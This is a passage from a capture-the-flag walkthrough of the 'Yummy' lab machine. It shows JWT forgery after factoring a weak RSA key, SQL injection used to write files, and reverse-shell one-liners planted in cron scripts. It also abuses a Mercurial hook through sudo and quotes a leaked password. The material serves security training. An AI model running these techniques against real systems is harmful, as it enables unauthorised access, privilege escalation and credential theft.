>>> cookie = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjB4ZGZAeXVtbXkuaHRiIiwicm9sZSI6ImN1c3RvbWVyX2I4ZjE0MTAyIiwiaWF0IjoxNzI4NTczMDY1LCJleHAiOjE3Mjg1NzY2NjUsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTI3NzU0NDg1NjI1Mzk4MTMwMDYyMzA4Nzc2NDM1MzM5ODAzMjU3MDYxOTIxMDk1NjIwNDUxOTI5NzE3Nzk3Njk4NDc2NzM0NTUwMzUzMjU5NjYxOTc4Mzk0MzQwMzU2OTM1MzYwNTU2MzQyOTYyNzI2OTQ2NDI5MTYzOTQ2MTA4MzA5OTgyOTUyNDYzNDg3NjA2MTIzOTQ5NDc4MDY5MTQzNTU4NzkwNTYxNTA0MzAwODQyMjcwNTA0NTA0NzU2MTQxNTY1MjUzODkyNzc4MzA5MjA4NjUxMDAyMDE4NzEyNTgyOTYzODUzMDUzNjE3MzUyMzg4MTA5NTk3MDA4NTIxNjQ0NzUzMzc3OTY4MzE5OTEwOTcwMjA1MjY3MTIxOTM5Mzc2ODgyODMxODI1NjQ5MjI4NjY5NDkxIiwiZSI6NjU1Mzd9fQ.AmSnL11eRvGm0Gr0S3eJ0wttN4UvrA8hD3kWvqpERNWgoMvS78mP8m6HF7L7TRiZbBjmvFCbELIPk-wVIB7EqvWNj4unAE-_95VK4QgKkEvOSu90CsXh4s_inP4kkTZkzuNH9o-kh6TCqNEZ7stUNjPZ3EZwIP1vwtOoHWxR8jopgLk"
>>> jwt.decode(cookie, options={"verify_signature": False})
{'email': '0xdf@yummy.htb', 'role': 'customer_b8f14102', 'iat': 1728573065, 'exp': 1728576665, 'jwk': {'kty': 'RSA', 'n': '127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491', 'e': 65537}}

```

The `n` value will change each time the Flask server is started, so it will be different each time I reset Yummy.

Sagemath has a nice `factor` function, and while it’s a huge pain to get installed, there’s an [online evaluator](https://sagecell.sagemath.org/) that’s very useful for a quick check like this:

![image-20241010111254991](/img/image-20241010111254991.png)

It factors in a couple seconds. With `p` and `q` I can generate the private key. I’ll use code very much like that in the source, just in a Python REPL:

```

>>> from Crypto.PublicKey import RSA
>>> q = 1011961
>>> n = 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
>>> p = n // q
>>> e = 65537
>>> phi_n = (p - 1) * (q - 1)
>>> d = pow(e, -1, phi_n)
>>> key = RSA.construct((n, e, d, p, q))

```

Rather than the hoops that Yummy jumps through, I’ll use the `export_key` function for `key` to write these to files:

```

>>> with open('yummy_rsa', 'wb') as f: f.write(key.export_key("PEM"))
... 
988
>>> with open('yummy_rsa.pub', 'wb') as f: f.write(key.publickey().export_key("PEM"))
... 
275

```

I could also do this with [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool), giving it the `n` and letting it crack and generate the keys:

```

oxdf@hacky$ python RsaCtfTool.py --private -n 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
['/tmp/tmppwsimkz4']

[*] Testing key /tmp/tmppwsimkz4.
attack initialized...
attack initialized...
[*] Performing system_primes_gcd attack on /tmp/tmppwsimkz4.
100%|██████████████████████████████████████████████████████████| 7007/7007 [00:00<00:00, 1317087.39it/s]
[+] Time elapsed: 0.0214 sec.
[*] Performing factordb attack on /tmp/tmppwsimkz4.
[*] Attack success with factordb method !
[+] Total time elapsed min,max,avg: 0.0214/0.0214/0.0214 sec.

Results for /tmp/tmppwsimkz4:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICKgIBAAKBgwrYAepqBabtXqmM86/hiODwryhCnsvu7vW3Nefy6Qfh3PLhoO1f
IcYVPVPj5YK6SuUfuQs7bwCe4ddU5et3fZg0ZpwyR0rszwFcyxXeCS9Y1t8n+cFm
lNT/ni+Dq3WTGc1XKc4vwNg/++7V25LuWazFiYiYa/AeynOG2WsrivT13WIzAgMB
AAECgYMArJuutQMwdaJ8mAdPa/vb+7ynPvj3cVFuZqFsZtrQzkc3MkO8Bor1kjdR
WxoDrwDTlpffV7WJ5vF+L1iiHivHqZMCMM9MHix+1sL4efuIRUIYIRfJJ4iCHk13
geWt3ix2JUTb/VS5EePIspi3YSlhgc/hZ5HlpUWre24l/ZevEk0gkQIDD3D5AoGB
ALPHMZkN+lIyDesajznLxISRw0UpfdW8P1PMAn68W2E6xwrBQs+e89pNmlN8APql
QO6ckGKn10dqlUo2+o7igGHIhKylh6N9eQZabE1jny/e6zpgQe3DJXQX2vewOsN+
jWzM46+QyFGxhUIGHLIJXFnT1Rauske7xMlbTtt0kSOLAgMJpOECgYAxEGYK3XO5
xwthZKg+H8yMWbOvRnmfQXcPCZiMuh8+U+pKlyACxeDLbW525lrmDP/Bn10Qb7oj
NYV08bhEErDy/uSmsa5pAi9renYgUNX7HJ2aGvcjSqUIIBKUkrYW8IzsaqahHaRu
F0LFGCHwvPlFUrjPLfJd/XLheVf2MMQDrQIDBIeA
-----END RSA PRIVATE KEY-----
oxdf@hacky$ python RsaCtfTool.py --createpub -n 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
-----BEGIN PUBLIC KEY-----
MIGhMA0GCSqGSIb3DQEBAQUAA4GPADCBiwKBgwrYAepqBabtXqmM86/hiODwryhC
nsvu7vW3Nefy6Qfh3PLhoO1fIcYVPVPj5YK6SuUfuQs7bwCe4ddU5et3fZg0Zpwy
R0rszwFcyxXeCS9Y1t8n+cFmlNT/ni+Dq3WTGc1XKc4vwNg/++7V25LuWazFiYiY
a/AeynOG2WsrivT13WIzAgMBAAE=
-----END PUBLIC KEY-----

```

#### Forge JWT

With these keys, I can forge a JWT that has the `role` value of `administrator` and my email. I’ll use [JWT\_Tool](https://github.com/ticarpi/jwt_tool). With no args, it will show me the current values like above:

```

oxdf@hacky$ python /opt/jwt_tool/jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjB4ZGZAeXVtbXkuaHRiIiwicm9sZSI6ImN1c3RvbWVyX2I4ZjE0MTAyIiwiaWF0IjoxNzI4NTczMDY1LCJleHAiOjE3Mjg1NzY2NjUsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTI3NzU0NDg1NjI1Mzk4MTMwMDYyMzA4Nzc2NDM1MzM5ODAzMjU3MDYxOTIxMDk1NjIwNDUxOTI5NzE3Nzk3Njk4NDc2NzM0NTUwMzUzMjU5NjYxOTc4Mzk0MzQwMzU2OTM1MzYwNTU2MzQyOTYyNzI2OTQ2NDI5MTYzOTQ2MTA4MzA5OTgyOTUyNDYzNDg3NjA2MTIzOTQ5NDc4MDY5MTQzNTU4NzkwNTYxNTA0MzAwODQyMjcwNTA0NTA0NzU2MTQxNTY1MjUzODkyNzc4MzA5MjA4NjUxMDAyMDE4NzEyNTgyOTYzODUzMDUzNjE3MzUyMzg4MTA5NTk3MDA4NTIxNjQ0NzUzMzc3OTY4MzE5OTEwOTcwMjA1MjY3MTIxOTM5Mzc2ODgyODMxODI1NjQ5MjI4NjY5NDkxIiwiZSI6NjU1Mzd9fQ.AmSnL11eRvGm0Gr0S3eJ0wttN4UvrA8hD3kWvqpERNWgoMvS78mP8m6HF7L7TRiZbBjmvFCbELIPk-wVIB7EqvWNj4unAE-_95VK4QgKkEvOSu90CsXh4s_inP4kkTZkzuNH9o-kh6TCqNEZ7stUNjPZ3EZwIP1vwtOoHWxR8jopgLk

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] typ = "JWT"

Token payload values:
[+] email = "0xdf@yummy.htb"
[+] role = "customer_b8f14102"
[+] iat = 1728573065    ==> TIMESTAMP = 2024-10-10 11:11:05 (UTC)
[+] exp = 1728576665    ==> TIMESTAMP = 2024-10-10 12:11:05 (UTC)
[+] jwk = JSON object:
    [+] kty = "RSA"
    [+] n = 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
    [+] e = 65537

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 1 hours, 0 mins
----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

```

With the following args, it will modify the cookie:
- `-pk` and `-pr` specify the public and private keys
- `-S` givens the algorithm
- `-I` to inject claims
- `-pc role` specifies the claim to target
- `-pv administrator` gives the value for that claim

```

oxdf@hacky$ python /opt/jwt_tool/jwt_tool.py -pk yummy_rsa.pub -pr yummy_rsa -S rs256 -I -pc role -pv administrator -pc exp -pv 2728560132 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjB4ZGZAeXVtbXkuaHRiIiwicm9sZSI6ImN1c3RvbWVyX2I4ZjE0MTAyIiwiaWF0IjoxNzI4NTczMDY1LCJleHAiOjE3Mjg1NzY2NjUsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTI3NzU0NDg1NjI1Mzk4MTMwMDYyMzA4Nzc2NDM1MzM5ODAzMjU3MDYxOTIxMDk1NjIwNDUxOTI5NzE3Nzk3Njk4NDc2NzM0NTUwMzUzMjU5NjYxOTc4Mzk0MzQwMzU2OTM1MzYwNTU2MzQyOTYyNzI2OTQ2NDI5MTYzOTQ2MTA4MzA5OTgyOTUyNDYzNDg3NjA2MTIzOTQ5NDc4MDY5MTQzNTU4NzkwNTYxNTA0MzAwODQyMjcwNTA0NTA0NzU2MTQxNTY1MjUzODkyNzc4MzA5MjA4NjUxMDAyMDE4NzEyNTgyOTYzODUzMDUzNjE3MzUyMzg4MTA5NTk3MDA4NTIxNjQ0NzUzMzc3OTY4MzE5OTEwOTcwMjA1MjY3MTIxOTM5Mzc2ODgyODMxODI1NjQ5MjI4NjY5NDkxIiwiZSI6NjU1Mzd9fQ.AmSnL11eRvGm0Gr0S3eJ0wttN4UvrA8hD3kWvqpERNWgoMvS78mP8m6HF7L7TRiZbBjmvFCbELIPk-wVIB7EqvWNj4unAE-_95VK4QgKkEvOSu90CsXh4s_inP4kkTZkzuNH9o-kh6TCqNEZ7stUNjPZ3EZwIP1vwtOoHWxR8jopgLk

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

jwttool_29ec2b0b58ae4ea35059f66cbb327e6d - Tampered token - RSA Signing:
[+] eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjB4ZGZAeXVtbXkuaHRiIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJpYXQiOjE3Mjg1NzMwNjUsImV4cCI6MjcyODU2MDEzMiwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMjc3NTQ0ODU2MjUzOTgxMzAwNjIzMDg3NzY0MzUzMzk4MDMyNTcwNjE5MjEwOTU2MjA0NTE5Mjk3MTc3OTc2OTg0NzY3MzQ1NTAzNTMyNTk2NjE5NzgzOTQzNDAzNTY5MzUzNjA1NTYzNDI5NjI3MjY5NDY0MjkxNjM5NDYxMDgzMDk5ODI5NTI0NjM0ODc2MDYxMjM5NDk0NzgwNjkxNDM1NTg3OTA1NjE1MDQzMDA4NDIyNzA1MDQ1MDQ3NTYxNDE1NjUyNTM4OTI3NzgzMDkyMDg2NTEwMDIwMTg3MTI1ODI5NjM4NTMwNTM2MTczNTIzODgxMDk1OTcwMDg1MjE2NDQ3NTMzNzc5NjgzMTk5MTA5NzAyMDUyNjcxMjE5MzkzNzY4ODI4MzE4MjU2NDkyMjg2Njk0OTEiLCJlIjo2NTUzN319.B6Mr5KD6om9dgaFnztxj6gysHnPiPOMwO2FPm4nDnu9epSlleWHrCC_T5s7FHC2ajQkXT5CeDgCrlL1qVA_dQXRQspvOi2O54kqdpl1Jb_XhWtHvu5XHLIVh6iPWeyvmPTSjaDhRcOUajAjIpE12te9_plvcuLoRTdW7O3wQuRt98rM

```

I’ll paste that into the Firefox dev tools as my cookie, and `/admindashboard` loads:

![image-20241010070650133](/img/image-20241010070650133.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

### Execution

#### SQLI POC

The injection is here in the Python source:

```

            # added option to order the reservations
            order_query = request.args.get('o', '')

            sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
            cursor.execute(sql, ('%' + search_query + '%',))
            connection.commit()
            appointments = cursor.fetchall()

```

It’s taking the `o` parameter (GET or POST) and using it for the search. I can see the reason for this by clicking the up or down arrow icons on the page to sort, and the page reloads with the URL `http://yummy.htb/admindashboard?s=&o=DESC`. If I add a single quote to the end of that URL, it crashes:

![image-20241010070803858](/img/image-20241010070803858.png)

#### sqlmap

I’ll save the request to `/admindashboard` with the `s` and `o` parameters to a file so that it keeps the JWT and pass it to `sqlmap`:

```

oxdf@hacky$ sqlmap -r admindash.request -p o --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...[snip]...
[07:18:58] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')
[07:18:59] [INFO] testing for SQL injection on GET parameter 'o'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
...[snip]...
[07:26:06] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 1924 HTTP(s) requests:
---
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)
    Payload: s=&o=DESC,EXTRACTVALUE(7214,CONCAT(0x5c,0x7162717071,(SELECT (ELT(7214=7214,1))),0x71787a7171))

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: s=&o=DESC;SELECT SLEEP(5)#
---
[07:26:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[07:26:13] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/yummy.htb'

```

Interestingly, it’s vulnerable to stacked queries. I typically don’t think of MySQL as allowing stacked queries - I’ll dig into the configuration in [Beyond Root](#mysql-misconfigurations).

#### Privilege Check

Generally I got for the DB, but I’ve already noticed above that if I can write files, I can get RCE. To check for file write, `sqlmap` has a `--privileges` flag:

```

oxdf@hacky$ sqlmap -r admindash.request -p o --privileges
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...[snip]...
[11:18:28] [INFO] parsing HTTP request from 'admindash.request'
[11:18:28] [INFO] resuming back-end DBMS 'mysql' 
[11:18:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)
    Payload: s=&o=DESC,EXTRACTVALUE(7214,CONCAT(0x5c,0x7162717071,(SELECT (ELT(7214=7214,1))),0x71787a7171))

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: s=&o=DESC;SELECT SLEEP(5)#
---
[11:18:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[11:18:28] [INFO] fetching database users privileges
[11:18:30] [INFO] retrieved: ''chef'@'localhost''
[11:18:30] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'chef'@'localhost' [1]:
    privilege: FILE
...[snip]...

```

The DB user has `FILE` privileges! MySQL being able to write files also is a non-default configuration, which I’ll show in [Beyond Root](#mysql-misconfigurations).

#### File Write POC

I’ll try writing a dummy file to Yummy:

```

(venv) oxdf@hacky$ echo "this is a test" > test
(venv) oxdf@hacky$ sqlmap -r admindash.request -p o --file-write test --file-dest /tmp/0xdf
...[snip]...
[11:23:14] [INFO] the local file 'test' and the remote file '/tmp/0xdf' have the same size (15 B)
...[snip]...

```

If I try to read this as the web user, it fails:

```

yummy> /tmp/0xdf
Access denied
yummy> /tmp/0xdf2
/tmp/0xdf2 not found

```

But it fails differently than a file that doesn’t exist, suggesting the write worked.

Because `sqlmap` can be a bit much, and stacked queries make this easy, I’ll do try writing manually as well. There’s no file named `/tmp/aaaa`:

```

yummy> /tmp/aaaa
/tmp/aaaa not found

```

I’ll visit:

```

http://yummy.htb/admindashboard?s=&o=DESC; select "test" INTO OUTFILE '/tmp/aaaa';

```

Now it exists:

```

yummy> /tmp/aaaa
Access denied

```

#### RCE

To get execution, I’ll need to write two files:
- Anything that isn’t “database is down” into `dbstatus.json`;
- The script to execute to `fixer-v[anything]`.

I’ll visit these two URLs:

```

http://yummy.htb/admindashboard?s=&o=DESC; select "test" INTO OUTFILE '/data/scripts/dbstatus.json';
http://yummy.htb/admindashboard?s=&o=DESC; select "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261" INTO OUTFILE '/data/scripts/fixer-v223.sh';

```

Within a minute, there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.36 49286
bash: cannot set terminal process group (332135): Inappropriate ioctl for device
bash: no job control in this shell
mysql@yummy:/var/spool/cron$

```

I’ll [upgrade the shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

mysql@yummy:/var/spool/cron$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
mysql@yummy:/var/spool/cron$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
mysql@yummy:/var/spool/cron$

```

## Shell as www-data

### Enumeration

#### Users

There are two non-root users on the box with home directories and shells:

```

mysql@yummy:/home$ ls
dev  qa
mysql@yummy:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev:/home/dev:/bin/bash
qa:x:1001:1001::/home/qa:/bin/bash

```

mysql can’t access either of these directories. mysql doesn’t have a home directory specified in `/etc/passwd`.

#### scripts

The scripts in the `/data/scripts` directory look like what I would have expected:

```

mysql@yummy:/data/scripts$ ls -la
total 32
drwxrwxrwx 2 root root 4096 Oct 10 15:45 .
drwxr-xr-x 3 root root 4096 Sep 30 08:16 ..
-rw-r--r-- 1 root root   90 Sep 26 15:31 app_backup.sh
-rw-r--r-- 1 root root 1336 Sep 26 15:31 dbmonitor.sh
-rw-r----- 1 root root   60 Oct 10 15:45 fixer-v1.0.1.sh
-rw-r--r-- 1 root root 5570 Sep 26 15:31 sqlappointments.sql
-rw-r--r-- 1 root root  114 Sep 26 15:31 table_cleanup.sh

```

However, the permissions on the directory are lax. Any user can delete and create files in here.

### Replace Cron Script

I know that www-data is running `app_backup.sh` every minute. I can’t edit the file, but I can move it and create a new one:

```

mysql@yummy:/data/scripts$ mv app_backup.sh app_backup.sh.bak; echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' | tee app_backup.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

When the minute rolls over, there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.36 45862
bash: cannot set terminal process group (333222): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yummy:/root$

```

It is weirdly running from `/root`, though www-data still can’t access anything:

```

www-data@yummy:/root$ ls
ls: cannot open directory '.': Permission denied

```

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@yummy:/root$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@yummy:/root$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ;fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@yummy:/root$ 

```

## Shell as qa

### Enumeration

#### App Directories

In `/var/www` there’s a `app-qatesting` as well as the `backup.zip` file from the backup job:

```

www-data@yummy:~$ ls
app-qatesting  backupapp.zip

```

The `app-qatesting` looks very similar to `/opt/app`, but looking at hidden files and directories, there’s a difference:

```

www-data@yummy:~/app-qatesting$ ls -la
total 40
drwxrwx--- 7 www-data qa        4096 Oct  8 00:43 .
drwxr-xr-x 3 www-data www-data  4096 Oct 10 15:54 ..
-rw-rw-r-- 1 qa       qa       10852 May 28 14:37 app.py
drwxr-xr-x 3 qa       qa        4096 May 28 14:26 config
drwxrwxr-x 6 qa       qa        4096 May 28 14:37 .hg
drwxr-xr-x 3 qa       qa        4096 May 28 14:26 middleware
drwxr-xr-x 6 qa       qa        4096 May 28 14:26 static
drwxr-xr-x 2 qa       qa        4096 May 28 14:26 templates
www-data@yummy:~/app-qatesting$ ls -la /opt/app/
total 40
drwxrwxr-x 7 root www-data  4096 Oct 10 15:54 .
drwxr-xr-x 3 root root      4096 Sep 30 08:16 ..
-rw-r--r-- 1 root root     11979 Sep 25 13:54 app.py
drwxr-xr-x 3 root root      4096 May 17 20:41 config
drwxr-xr-x 3 root root      4096 May 16 18:01 middleware
drwxrwxr-x 2 root root      4096 Sep 25 14:00 __pycache__
drwxr-xr-x 6 root root      4096 May 14 16:08 static
drwxr-xr-x 2 root root      4096 Sep 25 13:58 templates

```

`.hg` is a [Mercurial](https://wiki.mercurial-scm.org/Repository) repository, similar to Git.

#### Repo

I’ll show the commit history:

```

www-data@yummy:~/app-qatesting$ hg log --template '{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n'

f3787cac6111 | 2024-05-28 10:37:16 -0400 | qa: attempt at patching path traversal
0bbf8464d2d2 | 2024-05-28 10:34:38 -0400 | qa: removed comments
2ec0ee295b83 | 2024-05-28 10:32:50 -0400 | qa: patched SQL injection vuln
f87bdc6c94a8 | 2024-05-28 10:27:32 -0400 | qa: patched signature vuln
6c59496d5251 | 2024-05-28 10:25:11 -0400 | dev: updated db creds
f228abd7a139 | 2024-05-28 10:24:32 -0400 | dev: randomized secret key
9046153e7a23 | 2024-05-28 10:16:16 -0400 | dev: added admin order option
f2533b9083da | 2024-05-28 10:15:42 -0400 | dev: added admin capabilities
be935002334f | 2024-05-28 10:14:02 -0400 | dev: added admin template
f54c91c7fae8 | 2024-05-28 10:13:43 -0400 | dev: initial commit

```

I’ll use `hg diff -c [number]` to look at the changes over time. In 9, there’s a change of the DB creds:

```

www-data@yummy:~/app-qatesting$ hg diff -c 9        
WARNING: terminal is not fully functional
Press RETURN to continue 
diff -r 0bbf8464d2d2 -r f3787cac6111 app.py
--- a/app.py    Tue May 28 10:34:38 2024 -0400
+++ b/app.py    Tue May 28 10:37:16 2024 -0400
@@ -19,8 +19,8 @@
 
 db_config = {
     'host': '127.0.0.1',
-    'user': 'qa',
-    'password': 'jPAd!XQCtn8Oc@2B',
+    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
     'database': 'yummy_db',
     'cursorclass': pymysql.cursors.DictCursor,
     'client_flag': CLIENT.MULTI_STATEMENTS
@@ -135,7 +135,7 @@
     temp_dir = tempfile.mkdtemp()
     current_date_time = datetime.now()
     formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")
...[snip]...

```

Those look like creds for the qa user.

### su / SSH

They work over `su`:

```

www-data@yummy:~/app-qatesting$ su - qa
Password: 
qa@yummy:~$

```

And over SSH:

```

oxdf@hacky$ sshpass -p 'jPAd!XQCtn8Oc@2B' ssh qa@yummy.htb
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)
...[snip]...
qa@yummy:~$

```

I’ll grab `user.txt`:

```

qa@yummy:~$ cat user.txt
95e522c7************************

```

## Shell as dev

### Enumeration

#### Home Directory

The qa user’s home directory looks pretty typical:

```

qa@yummy:~$ ls -la
total 44
drwxr-x--- 6 qa   qa   4096 Sep 30 07:22 .
drwxr-xr-x 4 root root 4096 May 27 06:08 ..
lrwxrwxrwx 1 root root    9 May 27 06:08 .bash_history -> /dev/null
-rw-r--r-- 1 qa   qa    220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 qa   qa   3771 May 27 14:47 .bashrc
drwx------ 2 qa   qa   4096 Oct 10 16:03 .cache
drwx------ 3 qa   qa   4096 May 28 16:24 .gnupg
-rw-rw-r-- 1 qa   qa    728 May 29 15:04 .hgrc
drwxrwxr-x 3 qa   qa   4096 May 27 06:08 .local
-rw-r--r-- 1 qa   qa    807 Mar 31  2024 .profile
drwx------ 2 qa   qa   4096 May 28 15:01 .ssh
-rw-r----- 1 root qa     33 May 28 20:24 user.txt

```

`.hgrc` is interesting, as it’s related to the repo management.

```

# example user config (see 'hg help config' for more info)
[ui]
# name and email, e.g.
# username = Jane Doe <jdoe@example.com>
username = qa

# We recommend enabling tweakdefaults to get slight improvements to
# the UI over time. Make sure to set HGPLAIN in the environment when
# writing scripts!
# tweakdefaults = True

# uncomment to disable color in command output
# (see 'hg help color' for details)
# color = never

# uncomment to disable command output pagination
# (see 'hg help pager' for details)
# paginate = never

[extensions]
# uncomment the lines below to enable some popular extensions
# (see 'hg help extensions' for more info)
#
# histedit =
# rebase =
# uncommit =
[trusted]
users = qa, dev
groups = qa, dev

```

#### sudo

The qa user can run an `hg pull` command as dev:

```

qa@yummy:~$ sudo -l
[sudo] password for qa: 
Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/

```

This command will pull from `/home/dev/app-production` into the current repo. qa doesn’t have access to `app-production`.

### Abuse Hooks

The receiving repo can have hooks configured that run when a pull occurs, and these will happen as the user running the pull.

I’ll find a place to work from, `/dev/shm`, and create a repo:

```

qa@yummy:/dev/shm$ hg init
qa@yummy:/dev/shm$ ls -la
total 0
drwxrwxrwt  3 root root   60 Oct 10 17:08 .
drwxr-xr-x 20 root root 4040 Oct  7 21:35 ..
drwxrwxr-x  5 qa   qa    140 Oct 10 17:07 .hg

```

dev will need write access in the repo metadata, so I’ll give that:

```

qa@yummy:/dev/shm$ chmod -R 777 .hg

```

Inside that repo, I’ll put the hooks in a `hgrc` file inside the repo metadata. The various commands are defined [in the mecurial docs](https://repo.mercurial-scm.org/hg/help/hgrc) in the “hooks” section, including `pre-<command>`.

```

qa@yummy:/dev/shm$ echo -e '[hooks]\npre-pull = /tmp/0xdf' | tee .hg/hgrc
[hooks]
post-pull = /tmp/0xdf

```

I’ll create `/tmp/0xdf` such that it’s a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), and make sure to `chmod +x` it. Now I’ll run the `pull` command:

```

qa@yummy:/dev/shm$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/

```

This just hangs, but at `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.36 49980
I'm out of office until October 11th, don't call me
dev@yummy:/dev/shm$

```

I’ll [upgrade the shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q&sttick=0):

```

dev@yummy:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
I'm out of office until October 11th, don't call me
dev@yummy:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset

dev@yummy:~$

```

## Shell as root

### Enumeration

#### Home Directory

The dev user’s home directory isn’t too interesting:

```

dev@yummy:~$ ls -la
total 44
drwxr-x--- 7 dev  dev  4096 Oct 10 17:42 .
drwxr-xr-x 4 root root 4096 May 27 06:08 ..
drwxr-xr-x 7 dev  dev  4096 Oct 10 17:42 app-production
lrwxrwxrwx 1 root root    9 May 15 13:12 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 dev  dev  3887 May 27 14:48 .bashrc
